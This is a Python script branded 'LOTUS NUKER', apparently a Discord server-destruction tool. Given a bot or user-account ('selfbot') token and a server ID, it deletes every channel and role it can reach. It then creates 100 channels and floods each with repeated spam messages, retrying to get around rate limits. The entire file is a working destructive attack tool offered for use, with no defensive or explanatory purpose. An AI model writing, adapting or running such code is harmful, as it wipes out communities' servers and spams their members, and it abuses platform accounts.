import discord
import asyncio
import os
from discord.ext import commands
from colorama import Fore, init

init(autoreset=True)
PURPLE = Fore.MAGENTA

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(PURPLE + """
██╗      ██████╗ ████████╗██╗   ██╗███████╗
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝
██║     ██║   ██║   ██║   ██║   ██║███████╗
██║     ██║   ██║   ██║   ██║   ██║╚════██║
███████╗╚██████╔╝   ██║   ╚██████╔╝███████║
╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝
                                           
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                           """)

async def safe_action(coro, retries=5, delay=1.0):
    for _ in range(retries):
        try:
            return await coro
        except discord.HTTPException:
            await asyncio.sleep(delay)
        except Exception:
            break

async def spam_channel(channel, message, amount):
    for _ in range(amount):
        try:
            await channel.send(message)
        except:
            await asyncio.sleep(0.8)

class BotMode:
    def __init__(self, token, guild_id, spam_channel_name, spam_message, spam_amount):
        self.token = token
        self.guild_id = guild_id
        self.SPAM_CHANNEL_NAME = spam_channel_name
        self.SPAM_MESSAGE = spam_message
        self.SPAM_AMOUNT_PER_CHANNEL = spam_amount
        intents = discord.Intents.all()
        self.bot = commands.Bot(command_prefix=",", intents=intents)

        @self.bot.event
        async def on_ready():
            print(f"[Bot Mode] Logged In as {self.bot.user}")
            await self.nuke_all()

    async def nuke_all(self):
        guild = discord.utils.get(self.bot.guilds, id=self.guild_id)
        if not guild:
            print(f"[Bot Mode] Guild ID {self.guild_id} Not Found.")
            return

        print(f"[Bot Mode] Nuke {guild.name} ({guild.id})")

        await asyncio.gather(*(safe_action(c.delete()) for c in guild.channels))
        await asyncio.gather(*(safe_action(r.delete()) for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role))

        spam_channels = []
        created = await asyncio.gather(*(safe_action(guild.create_text_channel(self.SPAM_CHANNEL_NAME)) for _ in range(100)))
        for ch in created:
            if isinstance(ch, discord.TextChannel):
                spam_channels.append(ch)

        spam_tasks = [spam_channel(ch, self.SPAM_MESSAGE, self.SPAM_AMOUNT_PER_CHANNEL) for ch in spam_channels]
        if spam_tasks:
            await asyncio.gather(*spam_tasks)

        print(f"[Bot Mode] Finished Nuke {guild.name} {guild.id} | Channel Spammed: {len(spam_channels)}")

    def run(self):
        self.bot.run(self.token)

class SelfBotMode:
    def __init__(self, token, guild_id, spam_channel_name, spam_message, spam_amount):
        self.token = token
        self.guild_id = guild_id
        self.SPAM_CHANNEL_NAME = spam_channel_name
        self.SPAM_MESSAGE = spam_message
        self.SPAM_AMOUNT_PER_CHANNEL = spam_amount
        intents = discord.Intents.all()
        self.client = commands.Bot(command_prefix=",", self_bot=True, intents=intents)

        @self.client.event
        async def on_ready():
            print(f"[SelfBot Mode] Logged In As {self.client.user}")
            guild = discord.utils.get(self.client.guilds, id=self.guild_id)
            if guild:
                await self.nuke_all(guild)
            else:
                print("[SelfBot Mode] Guild Not Found.")

    async def nuke_all(self, guild):
        print(f"[SelfBot Mode] Nuke {guild.name} ({guild.id})")

        await asyncio.gather(*(safe_action(c.delete()) for c in guild.channels))
        await asyncio.gather(*(safe_action(r.delete()) for r in guild.roles if r.name != "@everyone"))

        spam_channels = []
        created = await asyncio.gather(*(safe_action(guild.create_text_channel(self.SPAM_CHANNEL_NAME)) for _ in range(100)))
        for ch in created:
            if isinstance(ch, discord.TextChannel):
                spam_channels.append(ch)

        spam_tasks = [spam_channel(ch, self.SPAM_MESSAGE, self.SPAM_AMOUNT_PER_CHANNEL) for ch in spam_channels]
        if spam_tasks:
            await asyncio.gather(*spam_tasks)

        print(f"[SelfBot Mode] Finished Nuke {guild.name} {guild.id} | Channel Spammed: {len(spam_channels)}")

    def run(self):
        self.client.run(self.token)

if __name__ == "__main__":
    banner()
    print("[1] Bot Mode\n[2] SelfBot Mode")
    mode = input("Select mode: ")

    spam_channel_name = input("Enter Channel Name: ")
    spam_message = input("Enter Message: ")
    spam_amount = int(input("Enter Amount: "))

    if mode == "1":
        token = input("Enter Bot Token: ")
        guild_id = int(input("Enter Guild ID: "))
        BotMode(token, guild_id, spam_channel_name, spam_message, spam_amount).run()

    elif mode == "2":
        token = input("Enter Selfbot Token: ")
        guild_id = int(input("Enter Guild ID: "))
        SelfBotMode(token, guild_id, spam_channel_name, spam_message, spam_amount).run()
